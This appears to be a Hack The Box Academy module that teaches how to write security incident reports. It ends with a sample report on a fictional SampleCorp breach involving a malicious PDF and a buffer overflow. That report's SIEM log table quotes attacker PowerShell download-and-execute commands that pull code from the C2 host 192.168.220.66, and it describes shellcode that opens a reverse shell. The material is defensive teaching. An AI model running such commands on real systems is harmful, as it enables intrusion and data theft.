# Introduction to Security Incident Reporting

In today's landscape, the question isn't whether a security incident will transpire, but rather when it will occur. Enterprises, governmental bodies, and individual users have grown exceedingly dependent on technology, which serves as the cornerstone for the vast majority of our activities.

While this technological advancement has augmented operational efficiency, revenue generation, and output, it has concomitantly escalated the associated risks. These technological platforms have become fertile grounds for malevolent actors, sponsored by both state and non-state entities. A meticulously designed and streamlined incident reporting mechanism is pivotal for any organization's preparedness to counter these emerging threats effectively.

Security incident reporting serves as a conduit between the identification and remediation of threats. It facilitates the archival of past incidents, thereby providing an invaluable repository for lessons learned from previous mistakes. This repository can be seamlessly integrated into a broader strategy for preempting and mitigating future threats. Given the perpetually evolving threat landscape, a comprehensive and consistent incident reporting framework is indispensable for ensuring that organizations and their workforce are optimally prepared for any contingencies.

Beyond merely reacting to threats, an efficacious reporting protocol also fulfills other internal organizational imperatives. Whether it's legal departments ensuring regulatory compliance, executive management assessing risk profiles, or CFOs evaluating financial repercussions, a well-structured incident report serves as a clarifying instrument for all stakeholders.

Effective incident reporting should strike a balance between granularity and accessibility, making it comprehensible to both technically savvy and non-technical audiences. This module's objective is to refine your grasp of the nuances involved in proficient incident reporting.

## Incident Identification and Categorisation

Navigating the labyrinthine array of cybersecurity threats that could potentially impact you or your organization necessitates a methodical approach to identifying and classifying security incidents. This enables the rapid allocation of resources and expedites threat mitigation. Essentially, the cornerstone of an initial successful response to an incident lies in the capability to promptly identify and categorize the threat.

#### Identifying Security Incidents

Security incidents can emanate from a diverse array of sources and often manifest as detections, anomalies, or deviations from established baselines. There are primarily three key sources for incident identification:

| Source | Description |
| --- | --- |
| Security Systems/Tooling in Place | There is a wide variety of security systems and tools likely in place within your organization. Some excellent sources for identification include IDS/IPS, EDR/XDR, SIEM tools, or even basic anti-virus alerts and NetFlow data. |
| Human Observations | Users may notice and report suspicious activities, unusual emails, or systems behaving abnormally. |
| Third Party Notifications | Partners, vendors, or even customers might inform organizations about any vulnerabilities or breaches they are experiencing. |

#### Categorising Security Incidents

Upon identification of an incident, it is imperative to categorize it to facilitate the prioritization and allocation of resources for an effective response. This categorization also aids in comprehending the nature of the incident, thereby informing subsequent briefings to stakeholders.

Examples of Incident Types:

- `Malware`: Malicious software encompassing viruses, worms, and ransomware.
- `Phishing`: Fraudulent endeavors to exfiltrate sensitive information, predominantly via email.
- `DDoS Attacks`: Deliberate attempts to inundate a system or network, thereby disrupting its regular functionality.
- `Unauthorised Access`: Incidents where unauthorized entities gain access to systems or data repositories.
- `Data Leakage`: Inadvertent exposure of confidential data, both within and outside the organizational perimeter.
- `Physical Breach`: Unauthorized physical access to secure locations.

#### Incident Severity Levels:

- `Critical` (P1): Imminent threats that jeopardize core business functionalities or sensitive data, necessitating immediate intervention.
- `High` (P2): Latent threats to business operations that, while not immediately detrimental, are of elevated priority.
- `Medium` (P3): Incidents that, although not posing an immediate threat to business operations, warrant timely attention.
- `Low` (P4): Trivial incidents or routine anomalies that can be managed within standard operational workflows.

It's crucial to recognize that incidents frequently straddle multiple categories and can dynamically shift in both category and severity as additional intelligence is garnered during the analysis phase. The fluid nature of these threats mandates a flexible yet structured approach to both identification and categorization.

## Conclusion

In summary, adept identification and categorization constitute the bedrock of any proficient Security Operations Center (SOC). These processes dictate the alacrity, precision, and effectiveness of the response measures, and consequently, the mitigation strategies.

Enable step-by-step solutions for all questions
![sparkles-icon-decoration](https://academy.hackthebox.com/images/sparkles-solid.svg)

#### Questions

Answer the question(s) below
to complete this Section and earn cubes!

\+ 3  Name the type of an incident involving an attempt of infiltration through an email.


Submit


# The Incident Reporting Process

The reporting process serves as the cohesive framework that binds all elements of security incident reporting. An effective, overarching reporting mechanism delivers not just clarity and direction, but also highly actionable insights. In this section, we'll dissect the requisite steps within this process.

#### 1\. Initial Detection & Acknowledgement

Before any incident can be formally reported, it must first be detected and acknowledged. Detection vectors can vary, ranging from human observation to automated alerts generated by deployed security tools. In some cases, the threat actor themselves may trigger the detection, especially if you're dealing with a ransomware incident.

#### 2\. Preliminary Analysis

During this phase, the scope and potential ramifications of the security incident must be ascertained. The incident should be categorized based on our previously established classification and severity metrics.

#### 3\. Incident Logging

Every facet, action, and observation related to the security incident should be meticulously logged using an established system. Popular platforms for this purpose include [JIRA](https://www.atlassian.com/software/jira) and [TheHive Project](https://thehive-project.org/). In the absence of such a system, alternative methods should be employed. Even rudimentary tools like pen and paper or a spreadsheet can suffice in a pinch.

#### 4\. Notification of Relevant Parties

Stakeholders must be promptly identified, and notifications should be segmented into:

- `Internal Communications`  - Relevant internal departments, such as IT, legal, PR, and executive teams, should be alerted. In cases where the incident has widespread and severe implications, an organization-wide notification may be warranted.
- `External Communications`  - Depending on the incident's nature and impact, external communications may be necessary. This could involve notifying customers, partners, regulatory bodies, or even the general public.

#### 5\. Detailed Investigation & Reporting

The duration of this phase can vary significantly, ranging from a couple of days to potentially years. What's crucial here is a comprehensive technical analysis coupled with a compilation of all findings. This in-depth investigation is vital for understanding the incident's full impact.

#### 6\. Final Report Creation

The culmination of your role as a security analyst or incident responder is the creation of a finalized incident report. This document will furnish regulators, insurers, and executive leadership with a detailed account of the incident, its origins, and the remedial actions taken.

#### 7\. Feedback Loop!

Post-incident reflection is essential for enhancing our preparedness for future incidents. This involves revisiting and analyzing the incident to identify areas for improvement.

## Conclusion

Far from being a mere procedural formality, the reporting process is a strategic asset that enhances an organization's resilience against security threats. Through rigorous documentation, analysis, and learning from each incident, organizations can convert challenges into opportunities for bolstering their security stance.

Enable step-by-step solutions for all questions
![sparkles-icon-decoration](https://academy.hackthebox.com/images/sparkles-solid.svg)

#### Questions

Answer the question(s) below
to complete this Section and earn cubes!

\+ 3  Name the step responsible for writing down every information that could be used and be classified as important. (2 words)


Submit


# Elements of a Proper Incident Report

## Executive Summary

Let's consider the `Executive Summary` as the gateway to our report, designed to cater to a broad audience, including non-technical stakeholders. This section should furnish the reader with a succinct overview, key findings, immediate actions executed, and the impact on stakeholders. Since many stakeholders may only peruse the `Executive Summary`, it's imperative to nail this section. Here's a more granular breakdown of what should be encapsulated in the `Executive Summary`:

| Section | Description |
| --- | --- |
| Incident ID | Unique identifier for the incident. |
| Incident Overview | Provide a concise summary of the incident's events (including initial detection) and explicitly state its type. Was it a ransomware attack, a large-scale data breach, or both? This should also encompass the estimated time and date of the incident, as well as its duration, the affected systems/data, and the status (ongoing, resolved, or escalated) |
| Key Findings | Enumerate any salient findings that emerged from the incident. What was the root cause? Was a specific CVE exploited? What data, if any, was compromised, exfiltrated, or jeopardized? |
| Immediate Actions Taken | Outline the immediate response measures taken. Were the affected systems promptly isolated? Was the root cause identified? Did we engage any third-party services, and if so, who were they? |
| Stakeholder Impact | Assess the potential impact on various stakeholders. For instance, did any customers experience downtime, and what are the financial ramifications? Was employee data compromised? Was proprietary information at risk, and what are the potential repercussions? |

## Technical Analysis

This section is where we dive deeply into the technical aspects, dissecting the events that transpired during the incident. It's likely to be the most voluminous part of the incident report. The following key points should be addressed:

#### Affected Systems & Data

Highlight all systems and data that were either potentially accessed or definitively compromised during the incident. If data was exfiltrated, specify the volume or quantity, if ascertainable.

#### Evidence Sources & Analysis

Emphasize the evidence scrutinized, the results, and the analytical methodology employed. For instance, if a compromise was confirmed through web access logs, include a screenshot for documentation. Maintaining evidence integrity is crucial, especially in criminal cases. A best practice is to hash files to ensure their integrity.

#### Indicators of Compromise (IoCs)

IoCs are instrumental for hunting potential compromises across our broader environment or even among partner organizations. It might also be feasible to attribute the attack to a specific threat group based on the IoCs identified. These can range from abnormal outbound traffic to unfamiliar processes and scheduled tasks initiated by the attacker.

#### Root Cause Analysis

Within this section, detail the root cause analysis conducted and elaborate on the underlying cause of the security incident (vulnerabilities exploited, failure points, etc.).

#### Technical Timeline

This is a pivotal component for comprehending the incident's sequence of events. The timeline should include:

- Reconnaissance
- Initial Compromise
- C2 Communications
- Enumeration
- Lateral Movement
- Data Access & Exfiltration
- Malware Deployment or Activity (including Process Injection and Persistence)
- Containment Times
- Eradication Times
- Recovery Times

#### Nature of the Attack

Deep-dive into the type of attack, as well as the tactics, techniques, and procedures (TTPs) employed by the attacker.

* * *

## Impact Analysis

Provide an evaluation of the adverse effects that the incident had on the organization's data, operations, and reputation. This analysis aims to quantify and qualify the extent of the damage caused by the incident, identifying which systems, processes, or data sets have been compromised. It also assesses the potential business implications, such as financial loss, regulatory penalties, and reputational damage.

* * *

## Response and Recovery Analysis

Outline the specific actions taken to contain the security incident, eradicate the threat, and restore normal operations. This section serves as a chronological account of the measures implemented to mitigate the impact and prevent future occurrences of similar incidents.

Here's a breakdown of what the "Response and Recovery" section typically includes:

#### Immediate Response Actions

**Revocation of Access**

- `Identification of Compromised Accounts/Systems`: A detailed account of how compromised accounts or systems were identified, including the tools and methodologies used.
- `Timeframe`: The exact time when unauthorized access was detected and subsequently revoked, down to the minute if possible.
- `Method of Revocation`: Explanation of the technical methods used to revoke access, such as disabling accounts, changing permissions, or altering firewall rules.
- `Impact`: Assessment of what revoking access immediately achieved, including the prevention of data exfiltration or further system compromise.

**Containment Strategy**

- `Short-term Containment`: Immediate actions taken to isolate affected systems from the network to prevent lateral movement of the threat actor.
- `Long-term Containment`: Strategic measures, such as network segmentation or zero-trust architecture implementation, aimed at long-term isolation of affected systems.
- `Effectiveness`: An evaluation of how effective the containment strategies were in limiting the impact of the incident.

#### Eradication Measures

**Malware Removal**

- `Identification`: Detailed procedures on how malware or malicious code was identified, including the use of Endpoint Detection and Response (EDR) tools or forensic analysis.
- `Removal Techniques`: Specific tools or manual methods used to remove the malware.
- `Verification`: Steps taken to ensure that the malware was completely eradicated, such as checksum verification or heuristic analysis.

**System Patching**

- `Vulnerability Identification`: How the vulnerabilities were discovered, including any CVE identifiers if applicable.
- `Patch Management`: Detailed account of the patching process, including testing, deployment, and verification stages.
- `Fallback Procedures`: Steps to revert the patches in case they cause system instability or other issues.

#### Recovery Steps

**Data Restoration**

- `Backup Validation`: Procedures to validate the integrity of backups before restoration.
- `Restoration Process`: Step-by-step account of how data was restored, including any decryption methods used if the data was encrypted.
- `Data Integrity Checks`: Methods used to verify the integrity of the restored data.

**System Validation**

- `Security Measures`: Actions taken to ensure that systems are secure before bringing them back online, such as reconfiguring firewalls or updating Intrusion Detection Systems (IDS).
- `Operational Checks`: Tests conducted to confirm that systems are fully operational and perform as expected in a production environment.

#### Post-Incident Actions

**Monitoring**

- `Enhanced Monitoring Plans`: Detailed plans for ongoing monitoring to detect similar vulnerabilities or attack patterns in the future.
- `Tools and Technologies`: Specific monitoring tools that will be employed, and how they integrate with existing systems for a holistic view.

**Lessons Learned**

- `Gap Analysis`: A thorough evaluation of what security measures failed and why.
- `Recommendations for Improvement`: Concrete, actionable recommendations based on the lessons learned, categorized by priority and timeline for implementation.
- `Future Strategy`: Long-term changes in policy, architecture, or personnel training to prevent similar incidents.

* * *

## Diagrams

Given that the narrative can become exceedingly complex, visual aids can be invaluable for simplifying the incident's intricacies:

- `Incident Flowchart`
  - Illustrate the attack's progression, from the initial entry point to its propagation throughout the network.
- `Affected Systems Map`
  - Depict the network topology, accentuating the compromised nodes. Use color-coding or annotations to indicate the severity of each compromise.
- `Attack Vector Diagram`


  - Utilize arrows, nodes, and annotations to trace the attacker's navigation and (post-)exploitation activities through our defenses visually.

![Diagram showing attack vectors like phishing, vulnerability exploits, insider threat, and open ports leading to network weaknesses in endpoints and servers.](https://assets.website-files.com/5ff66329429d880392f6cba2/62f4fbe4fe7a4e930f363c42_Attack%20Vector%20Scheme.jpg)

* * *

## Appendices

This section serves as a repository for supplementary material that provides additional context, evidence, or technical details that are crucial for a comprehensive understanding of the incident, its impact, and the response actions taken. This section is often considered the backbone of the report, offering raw data and artifacts that can be independently verified, thus adding credibility and depth to the narrative presented in the main body of the report.

The `Appendices` section may include:

- Log Files
- Network Diagrams (pre-incident and post-incident)
- Forensic Evidence (disk images, memory dumps, etc.)
- Code snippets
- Incident Response Checklist
- Communication Records
- Legal and Regulatory Documents (compliance forms, NDAs signed by external consultants, etc.)
- Glossary and Acronyms

* * *

## Best Practices

- `Root Cause Analysis`: Always aim to find the root cause of the incident to prevent future occurrences.
- `Community Sharing`: Share non-sensitive details with a community of defenders to improve collective cybersecurity.
- `Regular Updates`: Keep all stakeholders updated regularly throughout the incident response process.
- `External Review`: Consider third-party cybersecurity specialists to validate findings.

* * *

## Conclusion

A meticulously crafted incident report is non-negotiable following a security breach or attack. These reports offer an exhaustive analysis of what went awry, what measures were effective, the reasons behind them, and future preventive strategies.

Enable step-by-step solutions for all questions
![sparkles-icon-decoration](https://academy.hackthebox.com/images/sparkles-solid.svg)

#### Questions

Answer the question(s) below
to complete this Section and earn cubes!

\+ 4  Name the type of a diagram that provides an overview of the attack path and the methods used by an attacker. (3 words)


Submit


# Communications

In the midst of any crisis, effective communication is not just beneficial but crucial. The stakes are even higher during a security incident, where transparency, coordinated response efforts, and trust-building with stakeholders are paramount.

Let's dissect the various facets of communications and highlight some key components.

## Importance of Effective Communications

The significance of adept communications is multi-faceted and can be segmented into the following categories:

#### Stakeholder Trust

Transparent and coherent communication is instrumental in preserving stakeholder trust throughout an incident. It serves as a testament to an organization's responsibility, transparency, and command over the situation.

#### Coordination & Efficiency

Alignment among all parties involved is especially vital. A cybersecurity incident is not an isolated event affecting only the technical team; it has broader organizational implications. Keeping everyone on the same page is not just advisable but essential.

#### Regulatory Compliance

It's imperative to cross-verify the regulatory compliance mandates specific to your organization. These guidelines should be explicitly documented in your Incident Response Plan (IRP).

* * *

## Internal Communications

While often sidelined, internal communications are pivotal for conveying a consistent message across the organization. This becomes increasingly important in the event of information leaks, which are not uncommon within corporate settings. Let's look at some key elements of internal communications:

#### Immediate notification

Upon acknowledgment of an incident, stakeholders must be promptly informed.

#### Regular Updates

Consistent, periodic briefings should be disseminated to all involved teams. This ensures a shared understanding of the incident's status, its potential ramifications, and any pending actions.

#### Feedback Loop

A feedback loop should be established as a conduit for teams to exchange findings, voice concerns, or offer suggestions.

* * *

## External Communications

External communications are equally critical and often encompass a diverse array of third parties, from customers to governmental agencies and regulatory bodies. Navigating this landscape requires finesse and careful planning. Here are some key aspects to consider:

#### Affected Parties

Direct communication should be established with any parties impacted by the incident, be they customers, clients, or business partners.

#### Public Statement

For incidents of significant scale, a public statement may be warranted. Such a statement should be lucid and steer clear of overly technical jargon to prevent confusion among customers and other third parties.

#### Regulatory Bodies

Depending on your jurisdiction and the nature of the incident, you may be obligated to notify regulatory entities like the Information Commissioner's Office (ICO) within a stipulated timeframe.

* * *

## Navigating Communication Channels During Cybersecurity Incidents

When we're hit with a cybersecurity incident, the way we communicate becomes a linchpin for both our security posture and our compliance standing. Let's dissect the technical landscape of these communication channels and their intertwined implications.

1. **Security Dimensions of Communication Channels**:
   - `Encryption`: We must ensure that every piece of information we share is wrapped in robust end-to-end encryption. This is non-negotiable, especially when we're discussing the nitty-gritty of the incident, like which systems took a hit or which vulnerabilities got exploited.
   - `Authentication and Authorization`: Access to our communication channels should be as tight as Fort Knox. We can't stress enough the importance of multi-factor authentication (MFA) to double-check the identities of those trying to access the channel.
   - `Data Integrity`: We need to be certain that our messages remain unaltered during transit. Cryptographic hashing techniques can be our best bet to ensure the integrity of our communications.
   - `Ephemeral Communications`: For those top-secret discussions, we might consider using messaging platforms that auto-destruct messages post-reading. This minimizes the risk of any prying eyes accessing our sensitive data later on.
   - `Air-Gapped Communications`: In situations where we suspect our primary communication backbone might be under threat, we might need to resort to air-gapped systems. These systems are our last line of defense, completely isolated from other potentially compromised networks.
2. **Regulatory Dimensions of Communication Channels**:
   - `Data Privacy Laws`: We're operating in a world where data privacy regulations, like the EU's GDPR, hold significant sway. If we're discussing or sharing personal data, especially of EU residents, we need to toe the line with GDPR mandates.
   - `Breach Notification Mandates`: Certain jurisdictions have clear-cut timelines for breach notifications. We need to be aware of these when communicating about data breaches, ensuring we're not only timely but also adhering to the content guidelines set by these laws.
   - `Record-Keeping`: While we might lean towards ephemeral messages for security, some regulations mandate a clear record of all incident-related communications. It's a tightrope walk, but we need to find that balance.
   - `Cross-Border Communications`: When our incident spills over national borders, the communication game changes. Some nations have stringent data sovereignty laws, dictating the hows and wheres of data transmission and storage.
   - `Chain of Custody`: If there's even a hint that legal actions might follow the incident, we need to maintain an unbroken chain of custody for all communications. This ensures that if we need to present evidence in court, it's deemed admissible.


# Real-world Incident Report

## Executive Summary

- **`Incident ID`**: INC2019-0422-022

- **`Incident Severity`**: High (P2)

- **`Incident Status`**: Resolved

- **`Incident Overview`**: On the night of `April 22, 2019`, at precisely `01:05:00`, SampleCorp's Security Operations Center (SOC) detected unauthorized activity within the internal network, specifically through anomalous process initiation and suspicious-looking PowerShell commands. Leveraging the lack of robust network access controls and two security vulnerabilities, the unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:


  - `WKST01.samplecorp.com`: A system used for software development purposes.
  - `HR01.samplecorp.com`: A system used to process employee and partner data.

SampleCorp's SOC, in collaboration with the Digital Forensics and Incident Response (DFIR) units, managed to successfully contain the threat, eliminate both the introduced malicious software and existing security gaps, and ultimately restore the compromised systems to their original state.

- **`Key Findings`**: Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office. Investigative efforts revealed that the unauthorized entity initially compromised `WKST01.samplecorp.com` by exploiting a vulnerable version of `Acrobat Reader`. Additionally, the entity exploited a `buffer overflow vulnerability`, this time in a proprietary application developed by SampleCorp, to further penetrate the internal network. While no widespread data exfiltration was detected, likely owing to the rapid intervention by the SOC and DFIR teams, the unauthorized access to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` raise concerns. As a result, both company and client data should be regarded as potentially compromised to some extent.

- **`Immediate Actions`**: SampleCorp's SOC and DFIR teams exclusively managed the incident response procedures, without the involvement of any external service providers. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data. This included getting access to network traffic capture files. Additionally, all affected systems were plugged to a host security solution. As for event logs, they were automatically collected by the existing Elastic SIEM solution.

- **`Stakeholder Impact`**:
  - `Customers`: While no extensive data exfiltration was identified, the unauthorized access to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` raises concerns about the integrity and confidentiality of customer data. As a precautionary measure, some services were temporarily taken offline and some API keys were revoked, leading to brief periods of downtime for customers. The financial implications of this downtime are currently being assessed but could result in loss of revenue and customer trust.
  - `Employees`: The compromised systems included `HR01.samplecorp.com`, which typically houses sensitive employee information. Although we have no evidence to suggest that employee data was specifically targeted or extracted, the potential risk remains. Employees may be subject to identity theft or phishing attacks if their data was compromised.
  - `Business Partners`: Given that `WKST01.samplecorp.com`, a development environment, was among the compromised systems, there's a possibility that proprietary code or technology could have been exposed. This could have ramifications for business partners who rely on the integrity and exclusivity of SampleCorp's technology solutions.
  - `Regulatory Bodies`: The breach of systems, could have compliance implications. Regulatory bodies may impose fines or sanctions on SampleCorp for failing to adequately protect sensitive data, depending on the jurisdiction and the nature of the compromised data.
  - `Internal Teams`: The SOC and DFIR teams were able to contain the threat effectively, but the incident will likely necessitate a review and potential overhaul of current security measures. This could mean a reallocation of resources and budget adjustments, impacting other departments and projects.
  - `Shareholders`: The incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of the remedial actions taken and the company's ability to restore stakeholder confidence.

## Technical Analysis

#### Affected Systems & Data

Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office.

The unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:

- `WKST01.samplecorp.com`: This is a development environment that contains proprietary source code for upcoming software releases, as well as API keys for third-party services. The unauthorized entity did navigate through various directories, raising concerns about intellectual property theft and potential abuse of API keys.
- `HR01.samplecorp.com`: This is the Human Resources system that houses sensitive employee and partner data, including personal identification information, payroll details, and performance reviews. Our logs indicate that the unauthorized entity did gain access to this system. Most concerning is that an unencrypted database containing employee Social Security numbers and bank account details was accessed. While we have no evidence to suggest data was extracted, the potential risk of identity theft and financial fraud for employees is high.

#### Evidence Sources & Analysis

**WKST01.samplecorp.com**

On the night of `April 22, 2019`, at exactly `01:05:00`, SampleCorp's Security Operations Center (SOC) identified unauthorized activity within the internal network. This was detected through abnormal parent-child process relationships and suspicious PowerShell commands, as displayed in the following screenshot.

From the logs, PowerShell was invoked from `cmd.exe` to execute the contents of a remotely hosted script. The IP address of the remote host was an internal address, `192.168.220.66`, indicating that an unauthorized entity was already present within the internal network.

![Process creation logs showing cmd.exe and powershell.exe commands executed on April 22, 2019. Includes network activity with URLs to 192.168.220.66 for downloading a payload.](https://academy.hackthebox.com/storage/modules/238/1.png)

The earliest signs of malicious command execution point to `WKST01.samplecorp.com` being compromised, likely due to a malicious email attachment with a suspicious file named `cv.pdf` for the following reasons:

- The user accessed the email client `Mozilla Thunderbird`
- A suspicious file `cv.pdf` was opened with Adobe Reader 10.0, which is outdated and vulnerable to security flaws.
- Malicious commands were observed immediately following these events.

![Logs from April 22, 2019, showing email client and PDF opening, followed by cmd.exe commands indicating malicious activity.](https://academy.hackthebox.com/storage/modules/238/2_.png)

Additionally, `cmd.exe` and `powershell.exe` were spawned from `wmiprvse.exe`.

![Logs from April 22, 2019, showing processes for opening a PDF with Adobe Reader, followed by cmd.exe commands and execution of wmiprvse.exe.](https://academy.hackthebox.com/storage/modules/238/3_.png)

![Event data logs showing process details for wmiprvse.exe, including command line, process IDs, and source IP 192.168.220.66.](https://academy.hackthebox.com/storage/modules/238/4.png)

As already mentioned, the unauthorized entity then executed specific PowerShell commands.

![Command execution logs showing cmd.exe and PowerShell commands accessing directories and downloading from IP 192.168.220.66.](https://academy.hackthebox.com/storage/modules/238/5.png)

**Brief Analysis of 192.168.220.66**

From the logs, we identified four hosts on the network segment with corresponding IP addresses and hostnames. The host `192.168.220.66`, previously observed in the logs of `WKST01.samplecorp.com`, confirms the presence of an unauthorized entity in the internal network.

| IP | Hostname |
| --- | --- |
| 192.168.220.20 | DC01.samplecorp.com |
| 192.168.220.200 | WKST01.samplecorp.com |
| 192.168.220.101 | HR01.samplecorp.com |
| 192.168.220.202 | ENG01.samplecorp.com |

The below table is the result of a SIEM query that aimed to identify all instances of command execution initiated from `192.168.220.66`, based on data from `WKST01.samplecorp.com`.

| event\_data.CommandLine.keyword: Descending | beat.hostname.keyword: Descending | Count |
| --- | --- | --- |
| `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 5 |
| `cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 4 |
| `powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX` | WKST01 | 2 |
| `whoami` | WKST01 | 1 |
| `...` | ... | ... |
| `powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService; $m` | HR01 | 1 |

The results suggest that the unauthorized entity has successfully infiltrated the hosts: `WKST01.samplecorp.com` and `HR01.samplecorp.com`.

**HR01.samplecorp.com**

`HR01.samplecorp.com` was investigated next, as the unauthorized entity, `192.168.220.66`, was shown to establish a connection with `HR01.samplecorp.com` at the earliest possible moment in the packet capture.

![Network traffic logs filtered for IP 192.168.220.66, showing UDP and TCP packets with timestamps, source, destination, and protocol details.](https://academy.hackthebox.com/storage/modules/238/6.png)

Network traffic details suggest a buffer overflow attempt on the service running at port `31337` of `HR01.samplecorp.com`.

![Network traffic logs showing TCP packets between IPs 192.168.220.66 and 192.168.220.101, with hex data indicating a buffer overflow attempt.](https://academy.hackthebox.com/storage/modules/238/7.png)

The network traffic was exported as raw binary for further analysis.

![Hex dump showing EIP overwrite with '41' (A) characters and shellcode highlighted, indicating a buffer overflow exploit.](https://academy.hackthebox.com/storage/modules/238/8.png)

The extracted binary was analyzed in a shellcode debugger, `scdbg`.

`Scdbg` reveals that the shellcode will attempt to initiate a connection to `192.168.220.66` at port `4444`. This confirms that there has been an attempt to exploit a service running on port `31337` of `HR01.samplecorp.com`.

![Debugger output showing execution of scdbg.exe with bof2.bin, loading libraries, initializing sockets, and multiple connections to host 192.168.220.66 on port 4444.](https://academy.hackthebox.com/storage/modules/238/9.png)

A search for network connections between `HR01.samplecorp.com` and the unauthorized entity was conducted using the aforementioned traffic capture file. Results revealed connections back to the unauthorized entity on port `4444`. This indicates that the unauthorized entity successfully exploited a buffer overflow vuln to gain command execution on `HR01.samplecorp.com`.

![Network traffic logs filtered for IP 192.168.220.66, showing UDP and TCP packets with timestamps, source, destination, and protocol details, indicating scanning and connection attempts.](https://academy.hackthebox.com/storage/modules/238/6_.png)

The depth of the technical analysis can be tailored to ensure that all stakeholders are adequately informed about the incident and the actions taken in response. While we've chosen to keep the investigation details concise in this module to avoid overwhelming you, it's important to note that in a real-world situation, every claim or statement would be backed up with robust evidence.

#### Indicators of Compromise (IoCs)

- **`C2 IP`**: 192.168.220.66
- **`cv.pdf`** (SHA256): ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011

#### Root Cause Analysis

Insufficient network access controls allowed the unauthorized entity access to SampleCorp's internal network.

The primary catalysts for the incident were traced back to two significant vulnerabilities. The first vulnerability stemmed from the continued use of an outdated version of Acrobat Reader, while the second was attributed to a buffer overflow issue present within a proprietary application. Compounding these vulnerabilities was the inadequate network segregation of crucial systems, leaving them more exposed and easier targets for potential threats. Additionally, there was a notable gap in user awareness, evident from the absence of comprehensive training against phishing tactics, which could have served as the initial entry point for the attackers.

#### Technical Timeline

- Initial Compromise
  - `April 22nd, 2019, 00:27:27`: One of the employees opened a malicious PDF document ( `cv.pdf`) on `WKST01.samplecorp.com`, which exploited a known vulnerability in an outdated version of `Acrobat Reader`. This led to the execution of a malicious payload that established initial foothold on the system.
- Lateral Movement
  - `April 22nd, 2019, 00:50:18`: The unauthorized entity leveraged the initial access to perform reconnaissance on the internal network. They discovered a `buffer overflow` vulnerability in a proprietary HR application running on `HR01.samplecorp.com`. Using a crafted payload, they exploited this vulnerability to gain unauthorized access to the HR system.
- Data Access & Exfiltration
  - `April 22nd, 2019, 00:35:09`: The unauthorized entity accessed various directories on `WKST01.samplecorp.com` containing both proprietary source code and API keys.
  - `April 22nd, 2019, 01:30:12`: The unauthorized entity located an unencrypted database on `HR01.samplecorp.com` containing sensitive employee and partner data, including Social Security numbers and salary information. They compressed this data and exfiltrated it to an external server via a secure `SSH` tunnel.
- C2 Communications
  - An unauthorized entity gained physical access to SampleCorp's internal network. The Command and Control (C2) IP address identified was an internal one: `192.168.220.66`.
- Malware Deployment or Activity
  - The malware was disseminated via a malicious PDF document and made extensive use of legitimate Windows binaries for staging, command execution, and post-exploitation purposes.
  - Subsequently, shellcode was utilized within a buffer overflow payload to infect `HR01.samplecorp.com`.
- Containment Times
  - `April 22nd, 2019, 02:30:11`: SampleCorp's SOC and DFIR teams detected the unauthorized activities and immediately isolated `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the network using VLAN segmentation.
  - `April 22nd, 2019, 03:10:14`: SampleCorp's SOC and DFIR teams plugged a host security solution to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` to collect more data from the affected systems.
  - `April 22nd, 2019, 03:43:34`: The firewall rules were updated to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access.
- Eradication Times
  - `April 22nd, 2019, 04:11:00`: A specialized malware removal tool was used to clean both `WKST01.samplecorp.com` and `HR01.samplecorp.com` of the deployed malware.
  - `April 22nd, 2019, 04:30:00`: All systems, starting with `WKST01.samplecorp.com` were updated to the latest version of `Acrobat Reader`, mitigating the vulnerability that led to the initial compromise.
  - `April 22nd, 2019, 05:01:08`: The API keys that were accessed by the unauthorized entity have been revoked.
  - `April 22nd, 2019, 05:05:08`: The login credentials of the user who accessed the `cv.pdf` file, as well as those of users who have recently signed into both `WKST01.samplecorp.com` and `HR01.samplecorp.com`, have been reset.
- Recovery Times
  - `April 22nd, 2019, 05:21:20`: After ensuring that `WKST01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup.
  - `April 22nd, 2019, 05:58:50`: After ensuring that `HR01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup.
  - `April 22nd, 2019, 06:33:44`: The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`.

#### Nature of the Attack

In this segment, we should meticulously dissect the modus operandi of the unauthorized entity, shedding light on the specific tactics, techniques, and procedures (TTPs) they employed throughout their intrusion. For instance, let's dive into the methods the SOC team used to determine that the unauthorized entity utilized the Metasploit framework in their operations.

**Detecting Metasploit**

To better understand the tactics and techniques of the unauthorized entity, we delved into the malicious PowerShell commands executed.

Particularly, the one shown in the following screenshot.

![Logs showing multiple CMD commands for information gathering and file dropping, with PowerShell scripts downloading from 192.168.220.66, indicating a potential C2 channel setup.](https://academy.hackthebox.com/storage/modules/238/double_enc.png)

Upon inspection, it became clear that double encoding was used, likely as a means to bypass detection mechanisms. The SOC team successfully decoded the malicious payload, revealing the exact PowerShell code executed within the memory of `WKST01.samplecorp.com`.

![Screenshot of a PowerShell script with functions for loading assemblies, creating dynamic assemblies, and handling pointers. The script includes base64 encoded data and IP address 192.168.220.66. The command prompt shows ASCII decoding.](https://academy.hackthebox.com/storage/modules/238/decoded.png)

By leveraging open source intelligence, our SOC team determined that this PowerShell code is probably linked to the [Metasploit](https://github.com/rapid7/metasploit-framework) post-exploitation framework.

